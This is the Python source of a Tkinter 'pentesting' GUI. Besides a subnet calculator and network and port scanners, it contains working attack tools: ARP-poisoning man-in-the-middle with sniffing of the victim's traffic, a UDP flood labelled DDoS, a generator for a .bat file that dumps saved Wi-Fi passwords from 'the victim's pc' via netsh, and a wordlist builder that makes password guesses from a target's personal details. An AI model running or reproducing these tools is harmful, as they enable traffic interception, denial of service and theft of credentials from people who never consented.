import os, os.path
from os import listdir, system
from os.path import isfile, join
import tkinter as tk
import tkinter.ttk as ttk
from tkinter import filedialog, messagebox
from tkinter import *
import time
from datetime import datetime
import threading
from socket import *
import random
import requests



def calcSubnet(out, IP, mask):

    def Int2Bin(integer):
        binary = '.'.join([bin(int(x)+256)[3:] for x in integer.split('.')])
        return binary

    Subnet = mask
    IP_binary = Int2Bin(IP)
    Subnet_binary = Int2Bin(Subnet)


    # Wild Card
    def complement(number):
        if number == '0':
            number = '1'
        elif number == '.':
            pass
        else:
            number = '0'
        return number

    def find_wildcard(binary_subnet):
        binary_list = list(binary_subnet)
        wildcard = ''.join(complement(binary_list[y]) for y in range(len(binary_list)))
        return wildcard

    def convert_decimal(wildcard_Binary):
        binary = {}
        for x in range(4):
            binary[x] = int(wildcard_Binary.split(".")[x], 2)
        dec = ".".join(str(binary[x]) for x in range(4))
        return dec

    wildcard_binary = find_wildcard(Int2Bin(Subnet))
    WildCard = convert_decimal(wildcard_binary)
    out.insert(END, "\nWildcard %s"%(WildCard))

    # Network ID
    def andOP(IP1, IP2):
        ID_list = {}
        for y in range(4):
            ID_list[y] = int(IP1.split(".")[y]) & int(IP2.split(".")[y])
        ID = ".".join(str(ID_list[z]) for z in range(4))
        return ID

    networkID = andOP(IP, Subnet)
    network_Binary = Int2Bin(networkID)
    out.insert(END, "\nNetwork ID: %s"%(networkID))

    # Broadcast IP
    def orOP(IP1, IP2):
        Broadcast_list = {}
        for z in range(4):
            Broadcast_list[z] = int(IP1.split(".")[z]) | int(IP2.split(".")[z])
        broadcast = ".".join(str(Broadcast_list[c]) for c in range(4))
        return broadcast

    broadcastIP = orOP(networkID, WildCard)
    broadcastIP_binary = Int2Bin(broadcastIP)
    out.insert(END, "\nBroadcast IP: %s"%(broadcastIP))

    # Max IP
    def maxiIP(brdcstIP):
        maxIPs = brdcstIP.split(".")
        if int(brdcstIP.split(".")[3]) - 1 == 0:
            if int(brdcstIP.split(".")[2]) - 1 == 0:
                if int(brdcstIP.split(".")[1]) - 1 == 0:
                    maxIPs[0] = int(brdcstIP.split(".")[0]) - 1
                else:
                    maxIPs[1] = int(brdcstIP.split(".")[1]) - 1
            else:
                maxIPs[2] = int(brdcstIP.split(".")[2]) - 1
        else:
            maxIPs[3] = int(brdcstIP.split(".")[3]) - 1
        return ".".join(str(maxIPs[x]) for x in range(4))

    maxIP = maxiIP(broadcastIP)
    maxIP_binary = Int2Bin(maxIP)

    # Min IP
    def miniIP(ntwrkID):
        miniIPs = ntwrkID.split(".")
        if int(ntwrkID.split(".")[3]) + 1 == 256:
            if int(ntwrkID.split(".")[2]) + 1 == 256:
                if int(ntwrkID.split(".")[1]) + 1 == 256:
                    miniIPs[0] = int(ntwrkID.split(".")[0]) + 1
                    miniIPs[1] = 0
                    miniIPs[2] = 0
                    miniIPs[3] = 0
                else:
                    miniIPs[1] = int(ntwrkID.split(".")[1]) + 1
                    miniIPs[2] = 0
                    miniIPs[3] = 0
            else:
                miniIPs[2] = int(ntwrkID.split(".")[2]) + 1
                miniIPs[3] = 0
        else:
            miniIPs[3] = int(ntwrkID.split(".")[3]) + 1
        return ".".join(str(miniIPs[x]) for x in range(4))

    minIP = miniIP(networkID)
    minIP_binary = Int2Bin(networkID)

    addr_list=[]
    min1=minIP.split(".")
    max1=maxIP.split(".")
    if min1[1]==max1[1]:
        if min1[2]==max1[2]:
            addr_list.append(minIP)
        else:
            while int(min1[2])!=int(max1[2]):
                new="%s.%s.%s.1"%(min1[0],min1[1],min1[2])
                addr_list.append(new)
                min1[2]=int(min1[2])+1
    else:
        while int(min1[1])!=int(max1[1]):
            new="%s.%s.%s.1"%(min1[0],min1[1],min1[2])
            addr_list.append(new)
            min1[1]=int(min1[1])+1
    

    return addr_list




##for addr in ['B8:E8:56:3A:E9:E8']:
##        
##    vendor = requests.get('http://api.macvendors.com/' + addr).text
##    print(addr, vendor)


#show info single host (open ports, manufacturer...)
#save host table
#delete host from table

try:
    import scapy.all as scapy
except ImportError:
    print("'scapy' not installed\n")
    print("Trying to install 'scapy'...")
    try:
        os.system("py -m pip install scapy")
    except Exception:
        try:
            os.system("python -m pip install scapy")
        except Exception:
            print("Failed to install 'scapy'\nThe tool will not work. Please try to install 'scapy' manually")
import argparse
import sys
try:
    import netifaces
except ImportError:
    print("'netifaces' not installed\n")
    print("Trying to install 'netifaces'...")
    try:
        os.system("py -m pip install netifaces")
    except Exception:
        try:
            os.system("python -m pip install netifaces")
        except Exception:
            print("Failed to install 'netifaces'\nThe tool will not work. Please try to install 'netifaces' manually")



global version
version="2.0"

global be_verbose
be_verbose=0
global fast
fast = "n"
##global ipaddr, st1, en1, ver
##ipaddr="0.0.0.0"
##st1="0"
##en1="255"
##ver="n"

global captured_host
captured_host=[]


global sniff_V
sniff_v=False

global current_page
current_page=1

global ddos_on
ddos_on=False

global host_info
host_info=[]
#[0.0.0.0,[port1,port2,...],[dns,...]]

def NetworkScanner(ipaddr, st1, en1, ver, out, start, subn):
    global state_b
    #global ipaddr, st1, en1, ver
##    net = ipaddr
##    net1= net.split('.')
##    a = '.'
##
##    net2 = net1[0] + a + net1[1] + a + net1[2] + a
    #st1 = "START N"
    #en1 = "END N"
    en1 = en1 + 1

    verbose=ver

    ping1 = "ping -n 1 "

    t1 = datetime.now()
    #print ("Scanning in Progress:")
    out.insert(END, "Scanning in Progress...\n")

    def ping_ip(addr, v):
        ping1 = "ping -n 1 "
        arp1 = "arp -a "
        comm = ping1 + addr
        comm2 = arp1 + addr
        import socket
        hname=socket.getfqdn(str(addr))
        response = os.popen(comm)
        on=False
        for line in response.readlines():
           if (line.count("TTL")):
              on=True
              break
           else:
              pass
        if on==True:
            getmac = os.popen(comm2)
            mac=""
            for line in getmac.readlines():
                mac+=line
            mac=mac.split()
            try:
                mac=mac[10]
                #print ("[+]",addr, "--> Live\n\tMac address:",mac,"\n")
                out.insert(END, "[+] %s --> Live\n\tMac address: %s \n"%(addr, mac))
                out.insert(END, "\tHost Name: %s\n\n"%(hname))
                out.see("end")
                new=[addr, mac, hname]
                if new in captured_host:
                    pass
                else:
                    captured_host.append(new)
                             
                    
        
            except IndexError:
                #print ("[+]",addr, "--> Live\n")
                out.insert(END, "[+] %s --> Live (YOU)\n"%(addr))
                out.insert(END, "\tHost Name: %s\n\n"%(hname))
                out.see("end")
                
        if v=="y":
            #print ("[-]",addr, "--> Offline")
            out.insert(END, "[-] %s --> Offline\n"%(addr))
            out.see("end")
            

    sub=[ipaddr]
    if subn!="null":
        sub=calcSubnet(out, ipaddr, subn)
        out.insert(END, "\n%s-%s\n\n"%(sub[0],sub[-1]))
        st1=1
        en1=256

    for ips in sub:
        net = ips
        net1= net.split('.')
        a = '.'
        net2 = net1[0] + a + net1[1] + a + net1[2] + a
        addr_list=[]
        addr_list1=[]
        addr_list2=[]
        for ip in range(st1,en1):
            addr = net2 + str(ip)
            addr_list.append(addr)
        #addr_list.reverse()
        half=int(len(addr_list)/2)
        c=0
        for ip in addr_list[:half]:
            addr_list1.append(addr_list[c])
            c+=1
        c=half
        for ip in addr_list[half:]:
            addr_list2.append(addr_list[c])
            c+=1

        stop1=False
        while not stop1:
            for i in range(0,10):
                try:
                    tr1 = threading.Thread(target=ping_ip, args=(addr_list1[0], verbose,))
                    tr1.start()
                    addr_list1.pop(0)
                except IndexError:
                    pass
                try:
                    tr2 = threading.Thread(target=ping_ip, args=(addr_list2[0], verbose,))
                    tr2.start()
                    addr_list2.pop(0)
                except IndexError:
                    pass
                if addr_list1==[] and addr_list2==[]:
                    stop1=True
                    break
                time.sleep(0.1)



    time.sleep(5) 
    t2 = datetime.now()
    total = str(t2 - t1)
    total = total.replace("."," ")
    total = total.split()
    total = total[0]
    #print ("\nScanning completed in: ",total)
    out.insert(END, "\nScanning completed in: %s"%(total))
    out.see("end")
    start["state"]="normal"
#____________________________________________

def PortScanner(ipaddr, po1, po2, be_verbose, out, start):
    global port_c
    global fast
    port_c=[]
    tout=2
    def port_scanner(port, output, fast, tout):
        global port_c
        #global fast, tout
        s = socket(AF_INET, SOCK_STREAM)
        if fast=="y":
            s.settimeout(tout)
        conn = s.connect_ex((t_IP, port))
        if fast=="y":
            s.settimeout(None)
        if conn==0:
            #print("\t[+] Port %s: OPEN"%(port))
            out.insert(END, "\t[+] Port %s: OPEN\n"%(port))
            out.see("end")
            if port==21 or port==20:
                service="FTP"
            elif port==22:
                service="SSH"
            elif port==23:
                service="Telnet"
            elif port==25:
                service="SMTP"
            elif port==51 or port==50:
                service="IPSec"
            elif port==53:
                service="DNS"
            elif port==67 or port==68:
                service="DHCP"
            elif port==69:
                service="TFTP"
            elif port==80:
                service="HTTP"
            elif port==110:
                service="POP3"
            elif port==119:
                service="NNTP"
            elif port==123:
                service="NTP"
            elif port==135 or port==136 or port==137 or port==138 or port==139:
                service="NetBIOS"
            elif port==143:
                service="IMAP4"
            elif port==161 or port==162:
                service="SNMP"
            elif port==194:
                service="IRC"
            elif port==443:
                service="SSL"
            elif port==3389:
                service="RDP"
            else:
                service="Unknown"
                
            exs=False
            for p in port_c:
                #print(p)
                if port==p:
                    exs=True
                    break
            if exs==True:
                pass
            else:
                port_c.append([port,service])

                
                global host_info
                count1=0
                h_exist=False
                for h in host_info:
                    if h[0]==t_IP:
                        h_exist=True
                        break
                    count1+=1
                if h_exist==False:
                    host_info.append([t_IP,[port],"null"])
                else:
                    take=host_info[count1]
                    take1=take[1]
                    p_exist=False
                    for port1 in take1:
                        if port1==port:
                            p_exist=True
                            break
                    if p_exist==False:
                        take1.append(port)
                    take2=take[2]
                    new_data=[t_IP,take1,take2]
                    
        else:
            if output=="y":
                #print("[-] Port %s: CLOSED"%(port))
                out.insert(END, "[-] Port %s: CLOSED\n"%(port))
                out.see("end")
        s.close()
    

    target = ipaddr
    t_IP = gethostbyname(target)
    #print("Enter the range of port to be scanned ")
    port_min = po1
    port_max = po2
    port_max+=1
    #n_thread = int(input("Enter the number of thread to use (1-10): "))
    #while (n_thread<=0 or n_thread>=11):
    #    n_thread = int(input("Enter the number of thread to use (1-10): "))
    #fast = str(input("Fast mode? [y/n]: "))
    fastt = fast
        
    output = be_verbose

    #startTime = time.time()
    startTime = datetime.now()
    #print("Checking if host is up...")
    out.insert(END, "Checking if host is up...\n")
    response_time = time.time()
    response_ping=os.popen('ping -n 1 ' + target)
    response_time = round((time.time() - response_time),2)
    if response_ping==1:
        #print("[-] The host %s is down"%(target))
        out.insert(END, "[x] The host %s is down\n"%(target))
    else:
        #print("[+] The host %s is up\n"%(target))
        out.insert(END, "[+] The host %s is up\n"%(target))
        #print("[*]Testing port...\n")
        out.insert(END, "[*]Testing port...\n")
        response_time = time.time()
        s = socket(AF_INET, SOCK_STREAM)
        if fastt=="y":
            s.settimeout(tout)
        conn = s.connect_ex((t_IP, 22))
        if fastt=="y":
            s.settimeout(None)
        response_time = round((time.time() - response_time),2)
        now = datetime.now()
        current_time = now.strftime("%H:%M")
        #print("Host: %s"%(t_IP))
        out.insert(END, "Host: %s\n"%(t_IP))
        #print("Starting at %s"%(current_time))
        out.insert(END, "Starting at %s\n"%(current_time))
        est_time = round(((response_time*(port_max-port_min))/20), 0)
        m_e_t = str(round((est_time+5)/60,2))
        #m_e_t = m_e_t.replace(".",":")
        #print("Estimated time: %s m\n"%(m_e_t))
        out.insert(END, "Estimated time: %s m\n"%(m_e_t))
        #print(response_time)
        #print ('Starting scanning host...\n')
        out.insert(END, 'Starting scanning host...\n')
        port_list=[]
        for port in range(port_min, port_max):
            port_list.append(port)
            
        port_list1=[]
        port_list2=[]
        port_list3=[]
        three=int(len(port_list)/3)
        en=int(len(port_list))
        for port in port_list[:three]:
            port_list1.append(port)
        for port in port_list[three:three+three]:
            port_list2.append(port)
        for port in port_list[three+three:en]:
            port_list3.append(port)

        port_list_fast=[20,21,22,23,25,50,51,53,67,68,69,80,110,119,123,135,136,137,138,139,143,161,162,194,443,3389]
            
        def split(port_list):
            while (port_list!=[]):
                for i in range(0,20):
                    try:
                        tr = threading.Thread(target=port_scanner, args=(port_list[0], output, fastt, tout))
                        tr.start()
                        port_list.pop(0)
                        time.sleep(0.4)
                        if i==19:
                            tr.join()
                    except IndexError:
                        break
        if fastt=="y":
            tf = threading.Thread(target=split, args=(port_list_fast,))
            tf.start()
        t1 = threading.Thread(target=split, args=(port_list1,))
        t1.start()
        t2 = threading.Thread(target=split, args=(port_list2,))
        t2.start()
        t3 = threading.Thread(target=split, args=(port_list3,))
        t3.start()
        
        if fastt=="y":
            tf.join()
        t1.join()
        t2.join()
        t3.join()
        time.sleep(7)
        if port_c != []:
            out.insert(END, "-------------------------\n")
            out.insert(END, "##\tPORT\tSERVICE\n")
            c=0
            for p in port_c:
                out.insert(END, "%s\t%s\t%s\n"%(c,p[0],p[1]))
                c+=1
            out.insert(END, "-------------------------\n")
            out.see("end")
        else:
            out.insert(END, "\n\nThere are no open ports")
        #print('Time taken:', int(time.time() - startTime), "s")
        endTime = datetime.now()
        total = str(endTime - startTime)
        total = total.replace("."," ")
        total = total.split()
        total = total[0]
        out.insert(END, '\nScanned %s ports\nTime taken: %s s'%(en, total))
        out.see("end")
        start["state"]="normal"




#____________________________________________
global show_arp
show_arp=False
global show_dns
show_dns=False
global show_tcp
show_tcp=False
global show_udp
show_udp=False
global show_other
show_other=False

def ArpPoisoningAttack(target, gateway, out2, attack):
    global sniff_v
    def spoofer(targetIP, spoofIP, out2):
        global captured_host
        mac1=""
        exist=False
        for host in captured_host:
            if host[0]==targetIP:
                mac1=host[1]
                exist=True
                break
        try:
            if exist==False:
                arp1 = "arp -a "
                comm2 = arp1 + targetIP
                getmac = os.popen(comm2)
                mac=""
                for line in getmac.readlines():
                    mac+=line
                mac=mac.split()
                mac1=mac[10]
                new=[targetIP, mac]
                if new in captured_host:
                    pass
                else:
                    captured_host.append(new)
                
            
            destinationMac=mac1
        
            packet=scapy.ARP(op=2,pdst=targetIP,hwdst=destinationMac,psrc=spoofIP)
            scapy.send(packet, verbose=False)
        except Exception:
            #print("error")
            out2.insert(END, "\n[x] ERROR\n")

    def restore(destinationIP, sourceIP):
        
        def getMac(dest):
            global captured_host
            mac=""
            for host in captured_host:
                if host[0]==dest:
                    mac=host[1]
                    break
            return mac
        
        def getSourceMac(source):
            global captured_host
            mac=""
            for host in captured_host:
                if host[0]==source:
                    mac=host[1]
                    break
            return mac
        packet = scapy.ARP(op=2,pdst=destinationIP,hwdst=getMac(destinationIP),psrc=sourceIP,hwsrc=getSourceMac(sourceIP))
        scapy.send(packet, count=4,verbose=False)
        


    packets = 0
    targetIP=target
    gatewayIP=gateway
    
    def sniff_packet(out2, ip_addr):
        global show_dns, show_tcp, show_udp, show_arp, show_other
        from scapy.all import sniff
        global sniff_v
        while sniff_v:
            cap = sniff(count=1, filter="host %s"%(ip_addr))
            for c in cap:
                p=str(c.summary())
                p=p.split()
                if (p[2]=="IP" and p[4]=="TCP"):
                    #print("[IP/TCP] - %s > %s\n"%(p[5], p[7]))
                    if show_tcp==True:
                        out2.insert(END, "[IP/TCP] - %s > %s\n\n"%(p[5], p[7]))
                        out2.see("end")
                elif (p[2]=="IP" and p[4]=="UDP" and p[6]=="DNS"):
                    #print("[IP/UDP/DNS] %s %s\n"%(p[7], p[8]))
                    if show_dns==True:
                        out2.insert(END, "[IP/UDP/DNS] %s %s\n\n"%(p[7], p[8]))
                        out2.see("end")
                elif (p[2]=="IP" and p[4]=="UDP"):
                    #print("[IP/UDP] %s > %s\n"%(p[5], p[7]))
                    if show_udp==True:
                        out2.insert(END, "[IP/UDP] %s > %s\n\n"%(p[5], p[7]))
                        out2.see("end")
                elif (p[2]=="ARP"):
                    #print("[ARP] - who has %s says %s\n"%(p[5],p[7]))
                    if show_arp==True:
                        out2.insert(END, "[ARP] - who has %s says %s\n\n"%(p[5],p[7]))
                        out2.see("end")
                elif (p[2]=="IPv6" and p[4]=="UDP"):
                    #print("[IPv6/UDP] %s > %s\n"%(p[5], p[7]))
                    if show_other==True:
                        out2.insert(END, "[IPv6/UDP] %s > %s\n\n"%(p[5], p[7]))
                        out2.see("end")
                else:
                    if show_other==True:
                        out2.insert(END, "%s\n\n"%(p))
                        out2.see("end")
            
    out2.insert(END, "[+] Starting attack...\n")
    out2.see("end")
    while True:
        if attack["text"]=="Attack":
            sniff_v=False
            break
        else:
            spoofer(targetIP,gatewayIP, out2)
            spoofer(gatewayIP,targetIP, out2)
            #print("\r[+] Sent packets "+ str(packets))
            #out2.insert(END, "[+] Sent packets %s\n"%(str(packets)))
            #out2.see("end")
            sys.stdout.flush()
            packets +=2
            time.sleep(2)
            if sniff_v==False:
                sniff_v=True
                sn = threading.Thread(target=sniff_packet, args=(out2,target,))
                sn.start()
    #print("\nInterrupted Spoofing------------ Restoring to normal state..")
    time.sleep(2.5)
    out2.insert(END, "\n[*] Interrupted Spoofing (%s packets)\n[*] Restoring to normal state..."%(packets))
    out2.see("end")
    try:
        restore(targetIP,gatewayIP)
        restore(gatewayIP,targetIP)
    except Exception:
        out2.insert(END, "\n[x] Can't restore to normal state\n")
    out2.insert(END, "\n[+] Attack finished")
    out2.see("end")
    

#____________________________________________
global table_on
table_on=False
#global wifi_g
#wifi_g=False

def main():
    root=tk.Tk()
    root.title("Network Tool")
    root.geometry("950x700")
    root.config(bg="gray")
    nscan=Frame(root, bg="gray")
    mscan=Frame(root, bg="gray")
    arp_a=Frame(root, bg="gray")
    gshell=Frame(root, bg="gray")
    r_table=Frame(root, bg="darkgray")
    #tool_1=Frame(root, bg="gray")
    def menu_callback2():
        global version
        ds="discord.com/invite/D3AVjxF"
        info="Pentesting tool created by Hackerez\n(Discord: %s)\n\nVersion: %s"%(ds,version)
        info+="\n\nTools: Network Scanner, Port Scanner, ARP Poisoning Attack, Wifi Password Grabber"
        messagebox.showinfo("Info","%s"%(info))
    def menu_callback():
        global captured_host, table_on
        if table_on==False:
            table_on=True
            null=Label(r_table, text=" ", bg="darkgray")
            null.pack(padx=380, pady=140)
            tab1="------"
            txt="IP ADDRESS%s%s%sMAC ADDRESS%s%s%sHOST NAME"%(tab1,tab1,tab1,tab1,tab1,tab1)
##            txt+="-"*104
##            txt+="\n"
##            if captured_host==[]:
##                pass
##            else:
##                for host in captured_host:
##                    txt+="%s\t\t\t%s\t\t\t%s\n"%(host[0],host[1],host[2])
            global current_page, files
            files = []
            t=""
            for host in captured_host:
                t="%s\t\t\t%s\t\t\t%s"%(host[0],host[1],host[2])
                files.append(t)
                    
            global pages
            pages=1
            n_p=len(files)/10
            if isinstance(n_p, float):
                n=str(n_p)
                n=n.split(".")
                pages=int(n[0])+1
            else:
                pages=n_p
            #print("pages",pages)
            #print("n host",len(files))
            def table_frame():
                global labelframe_widget
                labelframe_widget = tk.LabelFrame(r_table,text=txt, bg="darkgray",font=("Courier CE",12))
                #label_widget=Text(labelframe_widget, height=15, width=65,bg="darkgray",font=("Courier CE",11))
                labelframe_widget.place(x=10, y=10)
                #label_widget.pack()
                #label_widget.insert(END, txt)

                def selected_host(i):
                    global captured_host, host_info
                    host=captured_host[i]
                    ip=host[0]
                    mac=host[1]
                    name=host[2]
                    window = Toplevel()
                    window.geometry('500x400')
                    window.config(bg="gray")
                    window.title(ip)
                    if ip!=name:
                        newlabel = Label(window, text="Host: %s (%s | %s)"%(name,ip,mac), bg="gray")
                        newlabel.pack()
                    else:
                        newlabel = Label(window, text="Host: %s (%s)"%(ip,mac), bg="gray")
                        newlabel.pack()

                    vendor = "Unknown"    
                    try:
                        for ad in [str(mac)]:      
                            vendor = requests.get('http://api.macvendors.com/' + ad).text
                        newlabe2 = Label(window, text="Manufacturer:  %s"%(vendor), bg="gray")
                        newlabe2.place(x=40, y=380)
                    except Exception:
                        newlabe2 = Label(window, text="Manufacturer:  %s"%(vendor), bg="gray")
                        newlabe2.place(x=40, y=380)

                        
                    def del_host(i, ip):
                        global captured_host, host_info
                        captured_host.pop(i)
                        c=0
                        for h in host_info:
                            if h[0]==ip:
                                host_info.pop(c)
                                break
                            c+=1
                        window.destroy()
                                
                        
                        
                    delete=Button(window, text="Delete Host", command=lambda i=i: del_host(i, ip) ,font=("Courier",8))
                    delete.place(x=400, y=50)

                    def start_ddos(ip,dout):
                        global ddos_on
                        if attack["text"]=="Stop":                    
                            attack["text"]="DDoS"
                            ddos_on=False
        
                        elif attack["text"]=="DDoS":
                            attack["text"]="Stop"
                            dout.delete("1.0","end")
                            at = threading.Thread(target=ddos, args=(ip, dout,))
                            at.start()
                            
                    def ddos(ip,dout):
                        global ddos_on
                        if ddos_on==False:
                            ddos_on=True
                            sock = socket(AF_INET, SOCK_DGRAM)
                            port=1
                            packets=0
                            #print("Starting ddos")
                            time.sleep(1)
                            dout.insert(END,"[+] Starting DDoS...\n")
                            bytes_ = random._urandom(1490)
                            time.sleep(0.5)
                            dout.insert(END,"[+] Sending packets...\n")
                            while ddos_on:
                                try:
                                    sock.sendto(bytes_, (ip,port))
                                except Exception:
                                    dout.insert(END,"[x] Error. Can't send packets.\n")
                                    break
                                port+=1
                                packets+=1
                                if port>65534:
                                    port=1
                            #print("sent",packets,"packets")
                            dout.insert(END,"[+] DDoS stopped\n[*] Sent %s packets"%(packets))
                            dout.see(END)

                    ddos_frame = tk.LabelFrame(window, text="", bg="gray",font=("Courier CE",12))
                    ddos_frame.place(x=5, y=30)
                    dout=Text(ddos_frame, height=5, width=35, bg="black", fg="white")
                    dout.pack(side=RIGHT, padx=5)
                    attack=Button(ddos_frame, text="DDoS", command=lambda ip=ip: start_ddos(ip,dout) ,font=("Courier",12))
                    attack.pack(side=LEFT)
                    #attack.place(x=5, y=10)

                    infos = Label(window, text="", bg="gray")
                    infos.place(x=20, y=180)

                    
                    
                    def select2(ip):
                        print("...")
                        global host_info
                        if radioValue2.get()==1:
                            try:
                                cc=0
                                for h in host_info:
                                    if h[0]==ip:
                                        break
                                    cc+=1
                                current=host_info[cc]
                                p_list=""
                                for p in current[1]:
                                    p_list+="%s | "%(p)
                                infos["text"]=p_list
                            except Exception as e:
                                infos["text"]="0 ports saved"
                                #print(e)
                            
                        

                    radioValue2 = tk.IntVar() 
 
                    rdioOne2 = tk.Radiobutton(window, text='Open Ports',
                                 variable=radioValue2, value=1, command=lambda ip=ip: select2(ip)) 
                    rdioTwo2 = tk.Radiobutton(window, text='Dns',
                                 variable=radioValue2, value=2, command=lambda ip=ip: select2(ip)) 

                    rdioOne2.place(x=10, y=150)
                    rdioTwo2.place(x=100, y=150)
                        

                
                btn_1 = []
                global current_page, files
                for i in range(len(files)):
                    i2=0
                    if current_page==1:
                        range1=0
                        range2=10
                    else:
                        range1=(current_page*10)-10
                        range2=current_page*10
                    #print(btn[c].cget("text"))
                    if i in range(range1, range2):
                        btn_1.append(Button(labelframe_widget, text=files[i], command=lambda c=i: selected_host(c)))
                        btn_1[i].pack()
                    else:
                        btn_1.append("null")
                        
                        
            def slide(val):
                global current_page, labelframe_widget
                #val=roll.get()
                current_page=int(roll.get())
                labelframe_widget.place_forget()
                table_frame()
                    
            table_frame()
            roll = Scale(r_table, from_=1, to=pages, orient=HORIZONTAL, command=slide)
            roll.pack(padx=5, pady=5)
            
            r_table.place(x=50, y=150)
        else:
            r_table.place_forget()
            table_on=False
    def submenu_callback1():
        tool_1=tk.Tk()
        tool_1.title("Wifi Password Grabber")
        tool_1.geometry("700x400")
        tool_1.config(bg="gray")
        labl=Label(tool_1, text="Description:", bg="gray",font=("Courier CE",13))
        labl.place(x=10, y=10)
        lab2=Label(tool_1, text="This tool generate a wifi password grabber (Windows 10) with extension .bat", bg="gray",font=("Courier CE",10))
        lab2.place(x=10, y=30)
        lab3=Label(tool_1, text="Put the file into a USB pendrive. When you put the USB into the victim's pc, double click the file .bat \nand wait for the prompt window to close.\n Then you can unplug the USB from the victim pc. On the USB you'll find a file 'output.txt' with the passwords.", bg="gray",font=("Courier CE",10))
        lab3.place(x=10, y=50)
        def gen_grabber():
            #comm=for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear | find/I "Nome SSID"
            comm1="for /f %s %s in ('netsh wlan show profiles') do @echo %s | findstr -i -v echo | netsh wlan show profiles %s key=clear | find/I %s"%('"skip=9 tokens=1,2 delims=:"',"%i","%j","%j", '"Nome SSID"')
            comm="netsh wlan show profiles"
            output = os.popen(comm)
            output=output.readlines()
            output=output[9]
            #output=output.replace("  ","")
            output=output.split()
            find1=False
            output2=""
            #print(output)
            for c in output:
                if find1==True:
                    output2+=c
                if c==":":
                    find1=True
            comm="netsh wlan show profiles %s key=clear"%(output2)
            output=os.popen(comm)
            output=output.readlines()
            nssid=output[21]

            find1=False
            output2=""
            for c in nssid:
                if c==":":
                    find1=True
                if find1==False:
                    output2+=c
            nssid=output2.replace("  ","")
            nkey=output[33]
            
            find1=False
            output2=""
            for c in nkey:
                if c==":":
                    find1=True
                if find1==False:
                    output2+=c
            nkey=output2.replace("  ","")
            
            nssid='"%s"'%(nssid)
            nkey='"%s"'%(nkey)
            #print(nssid+"\n"+nkey)
            comm1="for /f %s %s in ('netsh wlan show profiles') do @echo %s | findstr -i -v echo | netsh wlan show profiles %s key=clear | find/I %s"%('"skip=9 tokens=1,2 delims=:"',"%%i","%%j","%%j", nssid)
            comm2="for /f %s %s in ('netsh wlan show profiles') do @echo %s | findstr -i -v echo | netsh wlan show profiles %s key=clear | find/I %s"%('"skip=9 tokens=1,2 delims=:"',"%%i","%%j","%%j", nkey)
            file=open("password_grabber.bat","w")
            file.write("""
@echo off
call :sub >output.txt
exit /b

:sub
%s
%s
"""%(comm1, comm2))
            file.close()
            lab4=Label(tool_1, text="'password_grabber.bat' generated", bg="gray",font=("Courier CE",11), fg="darkgreen")
            lab4.place(x=10, y=250)
            
        gen=Button(tool_1, text="Generate", command=gen_grabber ,font=("Courier",12))
        gen.place(x=200,y=200, width=100,height=30)
                        
        
        
    def submenu_callback():
        #print("coming soon")
        tool_2=tk.Tk()
        tool_2.geometry("700x600")
        tool_2.config(bg="gray")
        tool_2.title("Wordlist Generator")

        lab1=Label(tool_2, text="<<<Wordlist Generator>>>", bg="gray")
        lab1.config(font=("Courier CE",14))
        lab1.place(x=200, y=10)

        lab2=Label(tool_2, text="(Tip: you can leave blank some info)", bg="gray")
        lab2.config(font=("Courier CE",10))
        lab2.place(x=20, y=40)
        
        #INPUTS
        lab3=Label(tool_2, text="Name:", bg="gray")
        lab3.config(font=("Courier CE",10))
        lab3.place(x=10, y=80)

        name1=Text(tool_2, height=1, width=18, bg="darkgray")
        name1.place(x=55, y=80)

        lab3=Label(tool_2, text="Surname:", bg="gray")
        lab3.config(font=("Courier CE",10))
        lab3.place(x=10, y=110)

        surname1=Text(tool_2, height=1, width=18, bg="darkgray")
        surname1.place(x=70, y=110)
        
        lab3=Label(tool_2, text="Nickname:", bg="gray")
        lab3.config(font=("Courier CE",10))
        lab3.place(x=10, y=140)

        nickname1=Text(tool_2, height=1, width=18, bg="darkgray")
        nickname1.place(x=75, y=140)

        lab3=Label(tool_2, text="Birthday (dd/mm/yyyy):", bg="gray")
        lab3.config(font=("Courier CE",10))
        lab3.place(x=10, y=170)

        birth1=Text(tool_2, height=1, width=18, bg="darkgray")
        birth1.place(x=150, y=170)

        lab3=Label(tool_2, text="Words (separated by a comma):\n(ex. word1,w2,w3 abc,...)", bg="gray")
        lab3.config(font=("Courier CE",10))
        lab3.place(x=10, y=200)

        words1=Text(tool_2, height=5, width=25, bg="darkgray")
        words1.place(x=200, y=200)
        #END INPUTS

        out1=Text(tool_2, height=12, width=40, bg="black", fg="white")
        out1.place(x=20, y=350)

        lab4=Label(tool_2, text="_"*50, bg="gray")
        lab4.config(font=("Courier CE",25))
        lab4.place(x=0, y=280)
        
        def get_wordlist():
            name=name1.get("1.0","end-1c")
            surname=surname1.get("1.0","end-1c")
            nickname=nickname1.get("1.0","end-1c")
            birthday=birth1.get("1.0","end-1c")
            words=words1.get("1.0","end-1c")
            lower_name=name.lower()
            lower_surname=surname.lower()
            lower_nickname=nickname.lower()
            upper_name=name.upper()
            upper_surname=surname.upper()
            upper_nickname=nickname.upper()
            bd=False
            dd=""
            mm=""
            yyyy=""
            yy=""
            if "/" in birthday:
                birthday=birthday.replace("/","")
            try:
                dd=birthday[0:2]
                bd=True
            except Exception:
                raise
                bd=False
            if bd==True:
                try:
                    mm=birthday[2:4]
                except Exception:
                    pass
                try:
                    yyyy=birthday[4:8]
                except Exception:
                    pass
                try:
                    yy=birthday[6:8]
                except Exception:
                    pass
            words=words.split(",")

            wordlist=[]
            word=""
            info0=[name,surname,nickname,birthday,dd,mm,yyyy,yy,lower_name,lower_surname,lower_nickname,upper_name,upper_surname,upper_nickname]
            info=[]
            for i in info0:
                if i!="":
                    info.append(i)
            
            for t1 in info:
                for t2 in info:
                    for t3 in info:
                        word=t1
                        wordlist.append(word)
                        word="%s%s"%(t1,t2)
                        wordlist.append(word)
                        word="%s_%s"%(t1,t2)
                        wordlist.append(word)
                        word="%s%s%s"%(t1,t2,t3)
                        wordlist.append(word)
                        word="%s_%s_%s"%(t1,t2,t3)
                        wordlist.append(word)
                        word="%s%s_%s"%(t1,t2,t3)
                        wordlist.append(word)
                        word="%s_%s%s"%(t1,t2,t3)
                        wordlist.append(word)
                        
            if words!="":       
                for t1 in words:
                    for t2 in words:
                        for t3 in words:
                            word=t1
                            wordlist.append(word)
                            word="%s%s"%(t1,t2)
                            wordlist.append(word)
                            word="%s_%s"%(t1,t2)
                            wordlist.append(word)
                            word="%s%s%s"%(t1,t2,t3)
                            wordlist.append(word)
                            word="%s_%s_%s"%(t1,t2,t3)
                            wordlist.append(word)
